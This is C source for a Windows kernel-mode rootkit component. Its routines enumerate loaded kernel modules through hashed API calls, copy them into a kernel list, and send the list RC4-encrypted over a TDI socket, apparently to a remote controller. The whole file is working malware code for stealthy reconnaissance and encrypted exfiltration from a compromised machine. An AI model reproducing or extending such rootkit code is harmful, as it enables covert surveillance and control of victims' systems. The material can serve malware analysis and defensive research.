#include "common.h"

PROOTKIT_MODULES_LIST_HEAD kernel_get_modules(IN PROOTKIT_API_HASH Hash)
{
	NTSTATUS st;
	ULONG bytes = 0;
	PROOTKIT_MODULES_ENTRY entrybuffer = NULL;
	PRTL_PROCESS_MODULES modules = NULL;
	PLDR_DATA_TABLE_ENTRY pDataTable = NULL;
	PLDR_DATA_TABLE_ENTRY Buffer = NULL;
	PLIST_ENTRY List = NULL;
	

	g_modules_head = (PROOTKIT_MODULES_LIST_HEAD)Hash->_ExAllocatePool(NonPagedPool, sizeof(ROOTKIT_MODULES_LIST_HEAD));
	if (g_modules_head == NULL)
		st = STATUS_NO_MEMORY;

	InitializeListHead(&g_modules_head->Entry);
	g_modules_head->NumberOfEntries = 0;

	// call function first time to get correct amount of bytes for allocation

	st = Hash->_ZwQuerySystemInformation(SystemModuleInformation, NULL, 0, &bytes);
	if (st == STATUS_INFO_LENGTH_MISMATCH)
	{
		// allocate mem

		Buffer = Hash->_ExAllocatePool(NonPagedPool, bytes);
		if (Buffer)
		{
			// now call again with all parameters

			st = Hash->_ZwQuerySystemInformation(SystemModuleInformation, Buffer, bytes, 0);
			if (NT_SUCCESS(st))
			{

				// fill the structure with previous allocated memory
				// check if the memory address is valid

				modules = (PRTL_PROCESS_MODULES)Buffer;
				if (modules && Hash->_MmIsAddressValid(modules) == TRUE)
				{
					// loop through all the loaded modules and
					// copy the contents to own List-Entry

					for (ULONG i = 0; i < modules->NumberOfModules; i++)
					{
						entrybuffer = (PROOTKIT_MODULES_ENTRY)Hash->_ExAllocatePool(NonPagedPool, sizeof(ROOTKIT_MODULES_ENTRY));
						memset(entrybuffer, 0, sizeof(ROOTKIT_MODULES_ENTRY));


						kistrcpy(entrybuffer->ModuleName, modules->Modules[i].FullPathName + modules->Modules[i].OffsetToFileName);
						kistrcpy(entrybuffer->ModulePath, modules->Modules[i].FullPathName);
						entrybuffer->ImageBase = modules->Modules[i].ImageBase;
						entrybuffer->ImageSize = modules->Modules[i].ImageSize;
						entrybuffer->LoadOrderIndex = (ULONG)modules->Modules[i].LoadOrderIndex;

						// make sure to introduce Spin lock for synchronization access
						// to our List and release it afterwards, since locks need to be
						// implemented as quick as possible

						Hash->_KfAcquireSpinLock(&g_globalspinlock);
						InsertTailList(&g_modules_head->Entry, &entrybuffer->Entry);
						Hash->_KfReleaseSpinLock(&g_globalspinlock, Irql);

						g_modules_head->NumberOfEntries++;

					}
				}
			}

			// free memory

			Hash->_ExFreePoolWithTag(Buffer,0);
		}
	}


	// return the amount of modules of List-Entry

	return g_modules_head;
}

ULONG rk_copy_modules_list_to_buffer(IN PROOTKIT_MODULES_ENTRY Buffer, IN PROOTKIT_API_HASH Hash)
{
	ULONG returnedlength = 0;
	PROOTKIT_MODULES_ENTRY modbuffer = NULL;
	SIZE_T ByteCheck = 0;

	if (g_modules_head == NULL)
		return 0;

	Hash->_KfAcquireSpinLock(&g_globalspinlock);
	
	while (!IsListEmpty(&g_modules_head->Entry))
	{
		modbuffer = (PROOTKIT_MODULES_ENTRY)RemoveTailList(&g_modules_head->Entry);
		kimemcpy(Buffer, modbuffer, sizeof(ROOTKIT_MODULES_ENTRY));
		Hash->_ExFreePoolWithTag(modbuffer,0);
		Buffer++;
		returnedlength++;
	}
	
	Hash->_KfReleaseSpinLock(&g_globalspinlock, Irql);

	Hash->_ExFreePoolWithTag(g_modules_head,0);
	g_modules_head = NULL;

	return returnedlength * sizeof(ROOTKIT_MODULES_ENTRY);
}

BOOLEAN rk_send_modules_to_userspace(IN PFILE_OBJECT SocketObject, IN PROOTKIT_API_HASH Hash)
{
	ULONG bytes = 0;
	ULONG returnedbytes = 0;
	INT sendsize = 0;
	PROOTKIT_MODULES_LIST_HEAD moduleshead = NULL;
	PVOID Buffer = NULL;
	PROOTKIT_MODULES_ENTRY Entry = NULL;
	NTSTATUS st;
	BOOLEAN g_cond = FALSE;
	PMDL Mdl = NULL;

	moduleshead = kernel_get_modules(Hash);
	bytes = moduleshead->NumberOfEntries*sizeof(ROOTKIT_MODULES_ENTRY);
	do
	{
		sendsize = send(SocketObject, (char*)&bytes, sizeof(ULONG));
		if (sendsize > 0)
		{
			Buffer = KiAllocateMappedVirtualMemory(bytes, 'kbot', &Mdl, Hash);
			if (Buffer && Hash->_MmIsAddressValid(Buffer) && KiIsMdlAdddressValid(Mdl,Hash) == TRUE)
			{
				Entry = (PROOTKIT_MODULES_ENTRY)Buffer;
				if (Entry && Hash->_MmIsAddressValid(Entry))
				{
					returnedbytes = rk_copy_modules_list_to_buffer(Entry, Hash);
					if (returnedbytes > 0)
					{
						sendsize = tdi_send_crypted(SocketObject, RC4_KEY_2, (PROOTKIT_MODULES_ENTRY)Entry, returnedbytes, 0);
						if (sendsize > 0)
						{
							g_cond = TRUE;
							goto clean;
						}
					}
				}
			}
		}

	} while (FALSE);

	// cleanup

clean:
	KiFreeMappedVirtualMemory(Buffer, 'kbot', Mdl, Hash);
	Buffer = NULL;

	return g_cond;
}